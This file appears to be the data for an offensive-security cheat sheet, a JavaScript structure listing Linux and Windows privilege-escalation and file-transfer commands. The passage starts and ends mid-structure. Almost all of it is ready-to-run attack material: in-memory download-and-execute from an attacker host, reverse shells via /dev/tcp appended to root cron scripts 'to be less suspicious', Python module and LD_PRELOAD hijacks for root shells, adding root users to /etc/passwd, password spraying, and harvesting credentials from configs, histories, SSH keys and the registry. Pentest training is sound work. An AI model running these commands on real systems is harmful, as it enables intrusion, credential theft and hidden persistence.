            { id: "ft7", label: "portproxy (pivot HTTP)", os: "Windows", command: "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=$$LHOST", notes: "Relay port 8080 → attacker:80 for pivoting through a compromised host." },
            { id: "ft8", label: "NetLoader (in-memory)", os: "Windows", command: "C:UsersPublicLoader.exe -path http://$$LHOST/tool.exe", notes: "Fetch and run in memory via NetLoader — no disk write." },
            { id: "ft9", label: "Download (PS WebClient)", os: "Windows", command: "(New-Object Net.WebClient).DownloadFile(\"http://$$LHOST/file.exe\",\"C:Temp\file.exe\")", notes: "" },
            { id: "ft10", label: "IEX in-memory load", os: "Windows", command: "iex (iwr http://$$LHOST/script.ps1 -UseBasicParsing)", notes: "Execute script in memory without touching disk." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 15. Linux Privilege Escalation ─────────────────────────────────────── */
  {
    id: 'linux-privesc',
    name: 'Linux Privilege Escalation',
    icon: '🐧',
    techniques: [
      /* ── Credential Access ─────────────────────────────────────────────── */
      {
        id: 'lpe-creds',
        name: 'Credential Access',
        description: 'Recover credentials stored on the system to escalate privileges or move laterally.',
        tags: ['linux', 'privesc', 'credentials'],
        subtechniques: [
          {
            id: 'lpe-cr',
            name: 'Reused Passwords',
            commands: [
              { id: 'lpr1', label: 'Try found password for root', os: 'Linux', command: 'su - root', notes: 'Attempt any credential found in config files, history, or DBs against the root account.' },
              { id: 'lpr2', label: 'Spray found password across local users', os: 'Linux', command: "for user in $(awk -F: '$3>=1000{print $1}' /etc/passwd); do\n  echo -n \"[*] Testing $user... \"\n  echo '$$PASSWORD' | timeout 2 su -c id $user 2>/dev/null && echo \"[+] WORKS: $user:$$PASSWORD\"\ndone", notes: 'Replace $$PASSWORD with the discovered credential.' },
              { id: 'lpr3', label: 'Try SSH locally with found cred', os: 'Linux', command: 'ssh $$USER@localhost', notes: 'Services often share credentials — test found passwords against SSH even if found elsewhere.' },
            ],
          },
          {
            id: 'lpe-ccf',
            name: 'Config File Credentials',
            commands: [
              { id: 'lpcf1', label: 'Grep configs for password strings', os: 'Linux', command: "grep -rn 'password\\|passwd\\|secret\\|api_key\\|token' /etc /opt /var /home \\\n  --include='*.conf' --include='*.config' --include='*.ini' \\\n  --include='*.yaml' --include='*.yml' --include='*.env' \\\n  --include='*.php' --include='*.py' --include='*.rb' \\\n  2>/dev/null | grep -v '^Binary' | grep '=' | head -50", notes: '' },
              { id: 'lpcf2', label: 'Find .env files', os: 'Linux', command: "find / -name '.env' -not -path '*/proc/*' -not -path '*/sys/*' 2>/dev/null | xargs cat 2>/dev/null", notes: 'Application .env files commonly hold DB passwords, API keys, and secrets.' },
              { id: 'lpcf3', label: 'WordPress config', os: 'Linux', command: "find / -name 'wp-config.php' 2>/dev/null | xargs grep -E 'DB_USER|DB_PASSWORD|DB_NAME|DB_HOST' 2>/dev/null", notes: '' },
              { id: 'lpcf4', label: 'PHP DB connection strings', os: 'Linux', command: "grep -rn 'mysqli_connect\\|new PDO\\|pg_connect' /var/www/ 2>/dev/null | head -20", notes: '' },
            ],
          },
          {
            id: 'lpe-cdb',
            name: 'Local Database Credentials',
            commands: [
              { id: 'lpdb1', label: 'MySQL as root (no password)', os: 'Linux', command: "mysql -u root --password='' -e 'select user,host,authentication_string from mysql.user;' 2>/dev/null", notes: 'MySQL commonly runs as root with no password in dev environments.' },
              { id: 'lpdb2', label: 'MySQL via sudo', os: 'Linux', command: "sudo mysql -e 'select user,authentication_string from mysql.user;' 2>/dev/null", notes: 'Requires mysql in sudo -l. Check first.' },
              { id: 'lpdb3', label: 'Find SQLite databases', os: 'Linux', command: "find / \\( -name '*.sqlite' -o -name '*.sqlite3' -o -name '*.db' \\) -not -path '*/proc/*' 2>/dev/null", notes: '' },
              { id: 'lpdb4', label: 'Dump SQLite users table', os: 'Linux', command: 'sqlite3 /path/to/app.db .schema\nsqlite3 /path/to/app.db "select * from users limit 20;"', notes: 'Check .schema first to discover table and column names.' },
              { id: 'lpdb5', label: 'PostgreSQL local auth', os: 'Linux', command: "psql -U postgres -c '\\du' 2>/dev/null\npsql -U postgres -c 'select usename,passwd from pg_shadow;' 2>/dev/null", notes: 'PostgreSQL allows passwordless login from localhost as the postgres OS user by default.' },
            ],
          },
          {
            id: 'lpe-cbh',
            name: 'Bash History',
            commands: [
              { id: 'lpbh1', label: 'Current user history files', os: 'Linux', command: 'cat ~/.bash_history 2>/dev/null\ncat ~/.zsh_history 2>/dev/null\ncat ~/.sh_history 2>/dev/null', notes: '' },
              { id: 'lpbh2', label: 'All users history files', os: 'Linux', command: "find /home /root -name '.*_history' 2>/dev/null | while read f; do echo \"=== $f ===\"; cat \"$f\"; done", notes: '' },
              { id: 'lpbh3', label: 'Grep history for credentials', os: 'Linux', command: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|secret|key|token|mysql|psql|ssh|sudo|curl.*-u|wget.*--password' | sort -u", notes: '' },
              { id: 'lpbh4', label: 'Other CLI tool histories', os: 'Linux', command: 'cat ~/.mysql_history ~/.psql_history ~/.python_history 2>/dev/null', notes: 'Database CLI tools log commands — embedded credentials in queries are common.' },
            ],
          },
          {
            id: 'lpe-cssh',
            name: 'SSH Keys',
            commands: [
              { id: 'lpss1', label: 'Find SSH private keys', os: 'Linux', command: "find / \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'id_dsa' -o -name '*.pem' \\) -not -path '*/proc/*' 2>/dev/null", notes: 'Check if unencrypted: grep -l "ENCRYPTED" <file> → if no match, no passphrase.' },
              { id: 'lpss2', label: 'Read authorized_keys (user mapping)', os: 'Linux', command: "find /home /root -name 'authorized_keys' 2>/dev/null | xargs cat 2>/dev/null", notes: 'Shows which keys are trusted — hints at other hosts where this key may work.' },
              { id: 'lpss3', label: 'known_hosts (pivot targets)', os: 'Linux', command: "find /home /root -name 'known_hosts' 2>/dev/null | xargs cat 2>/dev/null", notes: 'Reveals hosts this machine has connected to — lateral movement targets.' },
              { id: 'lpss4', label: 'Use found key for root', os: 'Linux', command: 'chmod 600 /tmp/id_rsa\nssh -i /tmp/id_rsa root@localhost', notes: '' },
              { id: 'lpss5', label: 'SSH config (proxy/pivot hints)', os: 'Linux', command: 'cat ~/.ssh/config 2>/dev/null', notes: 'May contain ProxyJump / ProxyCommand config pointing to internal hosts.' },
            ],
          },
          {
            id: 'lpe-csudo',
            name: 'Sudo Access',
            commands: [
              { id: 'lpsd1', label: 'List sudo rules', os: 'Linux', command: 'sudo -l', notes: 'The most important check. Look for NOPASSWD entries and any GTFOBins-exploitable binary.' },
              { id: 'lpsd2', label: 'Sudo to root shell directly', os: 'Linux', command: 'sudo /bin/bash\nsudo /bin/sh\nsudo su -', notes: 'If (ALL) NOPASSWD: ALL or /bin/bash is listed.' },
              { id: 'lpsd3', label: 'vim sudo escape', os: 'Linux', command: 'sudo vim -c \':!/bin/bash\'', notes: 'If vim is in sudo -l.' },
              { id: 'lpsd4', label: 'find sudo escape', os: 'Linux', command: 'sudo find . -exec /bin/bash \\; -quit', notes: 'If find is in sudo -l.' },
              { id: 'lpsd5', label: 'awk sudo escape', os: 'Linux', command: "sudo awk 'BEGIN {system(\"/bin/bash\")}'", notes: 'If awk is in sudo -l.' },
              { id: 'lpsd6', label: 'GTFOBins reference', os: 'Linux', command: '# https://gtfobins.github.io/gtfobins/BINARY/#sudo\n# Replace BINARY with the binary shown in sudo -l', notes: 'vim, find, awk, nmap, python, perl, less, more, man all have sudo escapes on GTFOBins.' },
            ],
          },
          {
            id: 'lpe-cgrp',
            name: 'Group Privileges',
            commands: [
              { id: 'lpgr1', label: 'Check current groups', os: 'Linux', command: 'id; groups', notes: 'Dangerous groups: docker, lxd/lxc, disk, adm, shadow, video, sudo.' },
              { id: 'lpgr2', label: 'Docker group escape', os: 'Linux', command: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', notes: 'If in docker group → full root filesystem access via container mount.' },
              { id: 'lpgr3', label: 'LXD group escape', os: 'Linux', command: 'lxc init ubuntu:18.04 privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\nlxc start privesc\nlxc exec privesc /bin/sh\n# Then inside container:\nchroot /mnt/root /bin/bash', notes: 'Requires network to pull image. For offline: import a pre-built image first.' },
              { id: 'lpgr4', label: 'Disk group (raw filesystem read)', os: 'Linux', command: 'debugfs /dev/sda1\n# In debugfs shell:\n# cat /etc/shadow\n# cat /root/.ssh/id_rsa', notes: 'debugfs gives raw read access to the disk — bypasses all file permissions.' },
              { id: 'lpgr5', label: 'ADM group (read system logs)', os: 'Linux', command: "cat /var/log/auth.log | grep -iE 'password|session|accepted' | tail -50\ncat /var/log/syslog | grep -i 'pass' | head -30", notes: 'ADM group can read logs that may contain credentials sent in plaintext.' },
            ],
          },
        ],
      },

      /* ── Exploit ────────────────────────────────────────────────────────── */
      {
        id: 'lpe-exploit',
        name: 'Exploit',
        description: 'Exploit vulnerable software — kernel, local services, or installed binaries — to gain root.',
        tags: ['linux', 'privesc', 'exploit'],
        subtechniques: [
          {
            id: 'lpe-esvc',
            name: 'Services on Localhost',
            commands: [
              { id: 'lpsv1', label: 'List localhost-only services', os: 'Linux', command: "ss -tlnp | grep '127\\.0\\.0\\.1'\nnetstat -tlnp 2>/dev/null | grep '127'", notes: 'Services bound to 127.0.0.1 are not exposed externally but reachable from the target.' },
              { id: 'lpsv2', label: 'All listening sockets with process', os: 'Linux', command: 'ss -tulnp', notes: 'TCP + UDP. Note services running as root that you can interact with as your current user.' },
              { id: 'lpsv3', label: 'Probe localhost HTTP service', os: 'Linux', command: 'curl -sv http://127.0.0.1:$$PORT/\ncurl -sv http://127.0.0.1:$$PORT/api/\nwget -qO- http://127.0.0.1:$$PORT/', notes: 'Admin panels and REST APIs running internally are common privesc vectors.' },
              { id: 'lpsv4', label: 'Forward internal port to attacker', os: 'Linux', command: 'ssh -R $$PORT:127.0.0.1:$$PORT $$USER@$$LHOST -N', notes: 'Expose the localhost service on your attacker machine via reverse SSH tunnel to interact with it properly.' },
            ],
          },
          {
            id: 'lpe-eker',
            name: 'Kernel Version',
            commands: [
              { id: 'lpke1', label: 'Get kernel version', os: 'Linux', command: 'uname -r\nuname -a\ncat /proc/version', notes: '' },
              { id: 'lpke2', label: 'Linux Exploit Suggester (LES)', os: 'Linux', command: 'curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash', notes: 'Matches kernel version against known CVEs and shows exploitation probability.' },
              { id: 'lpke3', label: 'Linux Exploit Suggester 2', os: 'Linux', command: 'wget -q https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O /tmp/les2.pl\nperl /tmp/les2.pl', notes: '' },
              { id: 'lpke4', label: 'searchsploit kernel (attacker box)', os: 'Linux', command: 'searchsploit "linux kernel $(uname -r | cut -d. -f1,2) local privilege escalation"', notes: 'Run from your attacker machine to search ExploitDB.' },
              { id: 'lpke5', label: 'DirtyPipe check (CVE-2022-0847)', os: 'Linux', command: "uname -r\n# Vulnerable: 5.8 <= kernel < 5.16.11 / 5.15.25 / 5.10.102\n# Exploit: overwrites SUID binary to get root shell", notes: 'DirtyPipe allows any unprivileged user to overwrite read-only files including SUID binaries.' },
            ],
          },
          {
            id: 'lpe-ebin',
            name: 'Binary File Versions',
            commands: [
              { id: 'lpbv1', label: 'Check key binary versions', os: 'Linux', command: 'sudo --version\npkexec --version\nscreen --version\nbash --version\n$(which python3) --version', notes: '' },
              { id: 'lpbv2', label: 'sudo — Baron Samedit (CVE-2021-3156)', os: 'Linux', command: '# Affects sudo < 1.9.5p2\nsudo --version\n# Quick check for heap overflow:\nsudoedit -s \'/\' $(python3 -c \'print("A"*65536)\')', notes: 'Heap buffer overflow in sudo. Affects most distros shipped before Feb 2021. Reliable LPE.' },
              { id: 'lpbv3', label: 'pkexec — PwnKit (CVE-2021-4034)', os: 'Linux', command: '# Affects polkit < 0.120 on most distros\npkexec --version\nls -la /usr/bin/pkexec\n# Any SUID pkexec on an unpatched system is exploitable', notes: 'Memory corruption in pkexec — local root on virtually all Linux distros. Patch was Jan 2022.' },
              { id: 'lpbv4', label: 'Installed package versions', os: 'Linux', command: 'dpkg -l 2>/dev/null | grep -E "sudo|screen|polkit|pkexec|vim"\nrpm -qa 2>/dev/null | grep -E "sudo|screen|polkit"', notes: '' },
              { id: 'lpbv5', label: 'LinPEAS full automated sweep', os: 'Linux', command: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.txt', notes: 'Run LinPEAS first — it checks all binary versions, CVEs, misconfigurations, and creds automatically.' },
            ],
          },
        ],
      },

      /* ── Misconfiguration ───────────────────────────────────────────────── */
      {
        id: 'lpe-misc',
        name: 'Misconfiguration',
        description: 'Abuse misconfigurations in cron jobs, SUID binaries, capabilities, file permissions, PATH, and sudoers.',
        tags: ['linux', 'privesc', 'misconfiguration'],
        subtechniques: [
          {
            id: 'lpe-mcron',
            name: 'Cron Jobs',
            commands: [
              { id: 'lpcr1', label: 'List all cron jobs', os: 'Linux', command: 'crontab -l 2>/dev/null\ncat /etc/crontab 2>/dev/null\nls -la /etc/cron.*/ 2>/dev/null\ncat /etc/cron.d/* 2>/dev/null', notes: '' },
              { id: 'lpcr2', label: 'pspy — monitor processes without root', os: 'Linux', command: 'wget -q https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O /tmp/pspy64\nchmod +x /tmp/pspy64\n/tmp/pspy64', notes: 'pspy intercepts process creation events without root. Best tool for spotting cron commands.' },
              { id: 'lpcr3', label: 'Watch for short-lived processes', os: 'Linux', command: 'watch -n 1 "ps aux --no-headers | grep -v grep"', notes: 'Slower than pspy but no download needed.' },
              { id: 'lpcr4', label: 'Check if cron script is writable', os: 'Linux', command: 'ls -la /path/to/cron_script.sh\nstat /path/to/cron_script.sh', notes: 'If the script run by a root cron job is world-writable → replace with a reverse shell.' },
              { id: 'lpcr5', label: 'Inject reverse shell into writable cron script', os: 'Linux', command: 'echo \'bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1\' >> /path/to/cron_script.sh', notes: 'Append rather than replace to keep the script functional (less suspicious).' },
              { id: 'lpcr6', label: 'Writable cron dependency (library hijack)', os: 'Linux', command: '# Identify imports in the cron script:\nhead -20 /path/to/cron_script.py\n# Check if import path is writable:\npython3 -c "import requests; print(requests.__file__)"\n# Overwrite the module:\necho \'import os; os.system("bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1")\' > /path/to/module/__init__.py', notes: 'Any file or library imported by a root-run script is a hijack vector if writable.' },
            ],
          },
          {
            id: 'lpe-msuid',
            name: 'SUID / SGID Files',
            commands: [
              { id: 'lpsi1', label: 'Find all SUID binaries', os: 'Linux', command: 'find / -perm -4000 -type f 2>/dev/null', notes: 'SUID = runs as file owner (usually root). Check each on GTFOBins.' },
              { id: 'lpsi2', label: 'Find all SGID binaries', os: 'Linux', command: 'find / -perm -2000 -type f 2>/dev/null', notes: 'SGID = runs with group owner privileges.' },
              { id: 'lpsi3', label: 'Filter out standard SUID binaries', os: 'Linux', command: "find / -perm -4000 -type f 2>/dev/null | grep -vxF \\\n  /usr/bin/sudo /usr/bin/passwd /usr/bin/su /usr/bin/newgrp \\\n  /usr/bin/chfn /usr/bin/chsh /usr/bin/gpasswd /usr/bin/pkexec \\\n  /usr/bin/mount /usr/bin/umount /usr/bin/ping", notes: 'Focus on non-standard SUID binaries — custom apps, third-party tools, and unusual system binaries.' },
              { id: 'lpsi4', label: 'GTFOBins SUID exploits', os: 'Linux', command: '# https://gtfobins.github.io/gtfobins/BINARY/#suid\n\n# bash SUID:\nbash -p\n\n# find SUID:\nfind . -exec /bin/bash -p \\; -quit\n\n# vim SUID:\nvim -c \':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-p")\'', notes: '' },
              { id: 'lpsi5', label: 'strings on custom SUID binary (PATH hijack check)', os: 'Linux', command: 'strings /path/to/suid_binary | grep -vE \'^/\'\nstrings /path/to/suid_binary | grep -E \'system|exec|popen\'', notes: 'If the binary calls a command without a full path (e.g. "service" not "/usr/sbin/service") → PATH hijack.' },
            ],
          },
          {
            id: 'lpe-mcap',
            name: 'Capabilities',
            commands: [
              { id: 'lpca1', label: 'List all binary capabilities', os: 'Linux', command: 'getcap -r / 2>/dev/null', notes: 'Dangerous caps: cap_setuid, cap_net_raw, cap_dac_read_search, cap_sys_admin, cap_sys_ptrace.' },
              { id: 'lpca2', label: 'Python cap_setuid → root shell', os: 'Linux', command: 'python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'', notes: 'Run as the python binary that has cap_setuid+ep set.' },
              { id: 'lpca3', label: 'Perl cap_setuid → root shell', os: 'Linux', command: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'", notes: 'If perl has cap_setuid.' },
              { id: 'lpca4', label: 'cap_dac_read_search (read any file)', os: 'Linux', command: '# Binary with cap_dac_read_search bypasses all read permission checks.\n# Example with tar:\ntar xvf /dev/null --to-stdout /etc/shadow 2>&1', notes: '' },
              { id: 'lpca5', label: 'GTFOBins capabilities reference', os: 'Linux', command: '# https://gtfobins.github.io/gtfobins/BINARY/#capabilities', notes: '' },
            ],
          },
          {
            id: 'lpe-mwf',
            name: 'Sensitive Files Writable',
            commands: [
              { id: 'lpwf1', label: 'Check /etc/passwd writable', os: 'Linux', command: 'ls -la /etc/passwd', notes: 'If writable → add a new root-level user directly.' },
              { id: 'lpwf2', label: 'Add root user to /etc/passwd', os: 'Linux', command: "# Generate password hash:\nopenssl passwd -1 'password123'\n# Append user (replace HASH with output above):\necho 'hax0r:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu - hax0r", notes: 'Writing a hash directly to /etc/passwd bypasses /etc/shadow lookup — works on most systems.' },
              { id: 'lpwf3', label: 'Check /etc/shadow writable', os: 'Linux', command: 'ls -la /etc/shadow', notes: '' },
              { id: 'lpwf4', label: 'Change root hash in /etc/shadow', os: 'Linux', command: "# Generate SHA-512 hash:\nmkpasswd -m sha-512 'newpassword'\n# Or: openssl passwd -6 newpassword\n# Replace root's hash in /etc/shadow with the output, then:\nsu - root", notes: '' },
              { id: 'lpwf5', label: 'Check /etc/sudoers writable', os: 'Linux', command: 'ls -la /etc/sudoers\nls -la /etc/sudoers.d/', notes: '' },
              { id: 'lpwf6', label: 'Add NOPASSWD rule to sudoers', os: 'Linux', command: "echo '$$USER ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\nsudo /bin/bash", notes: 'Verify syntax first with visudo -c. Invalid syntax can lock you out of sudo.' },
              { id: 'lpwf7', label: 'Find other writable config files', os: 'Linux', command: 'find /etc -writable -type f 2>/dev/null', notes: '' },
            ],
          },
          {
            id: 'lpe-mrf',
            name: 'Sensitive Files Readable',
            commands: [
              { id: 'lprf1', label: 'Read /etc/shadow', os: 'Linux', command: 'cat /etc/shadow', notes: 'If readable without root → crack hashes offline.' },
              { id: 'lprf2', label: 'Crack shadow hashes (hashcat)', os: 'Linux', command: "# SHA-512crypt ($6$) — most common:\nhashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt\n# SHA-256crypt ($5$): -m 7400\n# MD5crypt ($1$): -m 500\n# yescrypt ($y$): -m 160", notes: 'Copy hashes from /etc/shadow to your attacker machine first.' },
              { id: 'lprf3', label: 'Read root SSH private key', os: 'Linux', command: 'cat /root/.ssh/id_rsa\ncat /root/.ssh/id_ed25519', notes: 'If unencrypted → authenticate directly as root.' },
              { id: 'lprf4', label: 'Use stolen root SSH key', os: 'Linux', command: 'chmod 600 /tmp/root_key\nssh -i /tmp/root_key root@localhost', notes: '' },
              { id: 'lprf5', label: 'Find other readable secrets', os: 'Linux', command: "find /root /home -readable -type f 2>/dev/null | grep -iE '\\.ssh|pass|secret|key|token|cred' | head -20", notes: '' },
            ],
          },
          {
            id: 'lpe-mpath',
            name: 'Writable PATH',
            commands: [
              { id: 'lpwp1', label: 'Check for writable dirs in current PATH', os: 'Linux', command: 'IFS=: read -ra _p <<< "$PATH"\nfor d in "${_p[@]}"; do [ -w "$d" ] && echo "[WRITABLE] $d"; done', notes: 'A writable PATH dir → create a malicious binary named after a command called by a SUID binary or sudo script.' },
              { id: 'lpwp2', label: 'Check sudo secure_path', os: 'Linux', command: "sudo -l | grep 'secure_path'\n# Also check: sudo env | grep '^PATH'", notes: 'sudo often sets its own PATH (secure_path in sudoers) regardless of your environment.' },
              { id: 'lpwp3', label: 'Identify relative command in SUID binary', os: 'Linux', command: 'strings /path/to/suid_binary | grep -E \'^[a-z]\'', notes: 'If the binary calls "service start" instead of "/usr/sbin/service start" → PATH hijack is possible.' },
              { id: 'lpwp4', label: 'Create malicious binary in writable PATH dir', os: 'Linux', command: "echo -e '#!/bin/bash\\n/bin/bash -p' > /writable-dir/COMMAND_NAME\nchmod +x /writable-dir/COMMAND_NAME\nexport PATH=/writable-dir:$PATH", notes: 'Replace COMMAND_NAME with whatever the SUID binary calls. Run the SUID binary after to trigger it.' },
            ],
          },
          {
            id: 'lpe-mldp',
            name: 'LD_PRELOAD via sudoers',
            commands: [
              { id: 'lpld1', label: 'Check for LD_PRELOAD in sudo env_keep', os: 'Linux', command: 'sudo -l | grep -i LD_PRELOAD', notes: 'If env_keep includes LD_PRELOAD → any .so you write is loaded by the sudo command running as root.' },
              { id: 'lpld2', label: 'Write malicious shared library', os: 'Linux', command: "cat > /tmp/evil.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n  unsetenv(\"LD_PRELOAD\");\n  setgid(0); setuid(0);\n  system(\"/bin/bash\");\n}\nEOF\ngcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles", notes: 'The _init() function executes automatically when the library is loaded.' },
              { id: 'lpld3', label: 'Execute sudo with LD_PRELOAD', os: 'Linux', command: 'sudo LD_PRELOAD=/tmp/evil.so /usr/bin/ALLOWED_BINARY', notes: 'Replace ALLOWED_BINARY with any binary listed in your sudo -l. Library loads as root before the binary runs.' },
            ],
          },
        ],
      },
    ],
  },

  /* ── 16. Windows Privilege Escalation ───────────────────────────────────── */
  {
    id: 'windows-privesc',
    name: 'Windows Privilege Escalation',
    icon: '🪟',
    techniques: [
      /* ── Credential Access ─────────────────────────────────────────────── */
      {
        id: 'wpe-creds',
        name: 'Credential Access',
        description: 'Recover credentials stored on the system to escalate privileges or move laterally.',
        tags: ['windows', 'privesc', 'credentials'],
        subtechniques: [
          {
            id: 'wpe-cr',
            name: 'Reused Passwords',
            commands: [
              { id: 'wpcr1', label: 'Try found password for local admin', os: 'Windows', command: 'net use \\\\127.0.0.1\\C$ /user:Administrator "$$PASSWORD"', notes: 'Quick check — successful mount confirms local admin access.' },
              { id: 'wpcr2', label: 'Test WinRM with found creds (PowerShell)', os: 'Windows', command: '$cred = New-Object System.Management.Automation.PSCredential("$$USER", (ConvertTo-SecureString "$$PASSWORD" -AsPlainText -Force))\nEnter-PSSession -ComputerName $$IP -Credential $cred', notes: '' },
              { id: 'wpcr3', label: 'Spray found password on local accounts', os: 'Linux', command: "crackmapexec smb $$IP -u users.txt -p '$$PASSWORD' --local-auth --continue-on-success", notes: 'Run from your attacker machine. --local-auth tests against local accounts, not domain.' },
              { id: 'wpcr4', label: 'Test RDP with found creds', os: 'Linux', command: "xfreerdp /v:$$IP /u:$$USER /p:'$$PASSWORD' /cert-ignore", notes: '' },
            ],
          },
          {
            id: 'wpe-ccf',
            name: 'Credentials from Configuration Files',
            commands: [
              { id: 'wpcf1', label: 'Recursive grep for passwords in common config extensions', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.conf,*.ini,*.xml,*.yaml,*.yml,*.env,*.txt -ErrorAction SilentlyContinue |\nSelect-String -Pattern "password|passwd|secret|apikey|api_key|token|connectionstring" -CaseSensitive:$false |\nSelect-Object Path,LineNumber,Line | Format-List', notes: '' },
              { id: 'wpcf2', label: 'IIS web.config credentials', os: 'Windows', command: "Get-ChildItem -Path C:\\inetpub -Recurse -Filter 'web.config' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output \"=== $($_.FullName) ===\"; Get-Content $_.FullName } | Select-String -Pattern 'password|connectionString|username' -CaseSensitive:$false", notes: 'IIS connection strings often contain plaintext SQL credentials.' },
              { id: 'wpcf3', label: 'PowerShell history file', os: 'Windows', command: 'Get-Content "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>$null\nGet-Content "$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>$null', notes: 'PowerShell command history persists across sessions and commonly contains credentials passed as arguments.' },
              { id: 'wpcf4', label: 'All users\' PowerShell history', os: 'Windows', command: 'Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content', notes: 'Requires access to other users\' profile dirs — works as SYSTEM or local admin.' },
              { id: 'wpcf5', label: 'Find plaintext creds in scripts', os: 'Windows', command: "Get-ChildItem -Path C:\\ -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|secret|-pass ' | Select-Object Path,LineNumber,Line | Format-List", notes: '' },
            ],
          },
          {
            id: 'wpe-cdb',
            name: 'Credentials from Local Databases',
            commands: [
              { id: 'wpcdb1', label: 'Find SQLite database files', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.sqlite,*.sqlite3,*.db -ErrorAction SilentlyContinue | Select-Object FullName,Length', notes: 'SQLite databases often store application credentials — browsers, apps, services.' },
              { id: 'wpcdb2', label: 'Query SQLite DB (sqlite3.exe needed)', os: 'Windows', command: 'sqlite3.exe "C:\\path\\to\\app.db" ".tables"\nsqlite3.exe "C:\\path\\to\\app.db" "SELECT * FROM users LIMIT 20;"', notes: '' },
              { id: 'wpcdb3', label: 'MySQL client — try no password', os: 'Windows', command: 'mysql -u root -e "SELECT user,host,authentication_string FROM mysql.user;" 2>$null', notes: 'MySQL installed on Windows for dev/staging often has no root password.' },
              { id: 'wpcdb4', label: 'Find MSSQL connection strings', os: 'Windows', command: "Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern 'Data Source|Initial Catalog|User ID|Password' | Format-List", notes: '' },
            ],
          },
          {
            id: 'wpe-cck',
            name: 'Credentials from cmdkey',
            commands: [
              { id: 'wpcck1', label: 'List stored credentials', os: 'Windows', command: 'cmdkey /list', notes: 'Lists cached Windows credentials — RDP, network shares, domain accounts. Look for Administrator or domain entries.' },
              { id: 'wpcck2', label: 'Use stored cred with runas', os: 'Windows', command: 'runas /savedcred /user:$$DOMAIN\\$$USER cmd.exe', notes: 'If cmdkey has a saved credential for the user — launches process with those stored credentials.' },
              { id: 'wpcck3', label: 'Use stored cred for reverse shell', os: 'Windows', command: 'runas /savedcred /user:Administrator "cmd.exe /c $$REVSHELL_CMD"', notes: 'Replace $$REVSHELL_CMD with your payload. Useful if saved cred is for local Administrator.' },
            ],
          },
          {
            id: 'wpe-cre',
            name: 'Credentials from Registry',
            commands: [
              { id: 'wpcre1', label: 'Autologon credentials', os: 'Windows', command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v AltDefaultPassword', notes: 'Autologon stores the password in plaintext. Very common on kiosk and service machines.' },
              { id: 'wpcre2', label: 'PuTTY saved sessions', os: 'Windows', command: 'reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s 2>$null', notes: 'PuTTY sessions may contain stored usernames and proxy passwords.' },
              { id: 'wpcre3', label: 'Global registry password search', os: 'Windows', command: 'reg query HKLM /f password /t REG_SZ /s 2>$null\nreg query HKCU /f password /t REG_SZ /s 2>$null', notes: 'Slow but thorough. Pipe to Out-File to review offline: reg query HKLM /f password /s > C:\\temp\\regdump.txt' },
              { id: 'wpcre4', label: 'VNC password in registry', os: 'Windows', command: 'reg query "HKCU\\Software\\ORL\\WinVNC3\\Password" 2>$null\nreg query "HKLM\\Software\\RealVNC\\WinVNC4" /v password 2>$null', notes: 'VNC stores an obfuscated (not truly encrypted) password — can be decrypted with known tools.' },
            ],
          },
          {
            id: 'wpe-cua',
            name: 'Credentials from Unattend / Sysprep Files',
            commands: [
              { id: 'wpcu1', label: 'Find unattend.xml files', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include unattend.xml,unattended.xml,sysprep.xml,autounattend.xml -ErrorAction SilentlyContinue | Get-Content', notes: 'Unattend files used for Windows deployment often contain the local Administrator password in base64.' },
              { id: 'wpcu2', label: 'Standard unattend search paths', os: 'Windows', command: 'Get-Content C:\\Windows\\sysprep\\sysprep.xml 2>$null\nGet-Content C:\\Windows\\sysprep\\sysprep.inf 2>$null\nGet-Content C:\\Windows\\Panther\\unattend.xml 2>$null\nGet-Content C:\\Windows\\Panther\\Unattended.xml 2>$null\nGet-Content C:\\Windows\\system32\\sysprep.inf 2>$null\nGet-Content C:\\Windows\\system32\\sysprep\\sysprep.xml 2>$null', notes: '' },
